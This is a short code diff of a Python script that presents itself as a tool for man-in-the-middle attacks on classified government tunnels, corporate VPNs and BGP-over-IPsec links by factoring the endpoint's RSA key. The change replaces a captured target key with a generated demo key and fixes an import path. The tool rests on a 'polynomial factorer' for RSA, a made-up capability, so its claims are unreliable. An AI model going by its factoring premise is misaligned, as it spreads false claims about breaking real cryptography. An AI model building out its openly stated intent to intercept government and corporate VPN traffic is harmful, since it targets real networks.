@@ -5,16 +5,15 @@ MitM classified government tunnels, corporate VPNs, and BGP-over-IPsec links.
 """
 
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
 
 import hashlib
 import struct
 
 # Target VPN endpoint RSA key — from DNS IPSECKEY record or IKE capture
-VPN_ENDPOINT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
-
-# IKEv2 (RFC 7296) constants
+_demo = generate_demo_target()
+VPN_ENDPOINT_PUBKEY_PEM = _demo["pub_pem"]
 IKE_SA_INIT = 34
 IKE_AUTH = 35
 AUTH_METHOD_RSA_SIG = 1
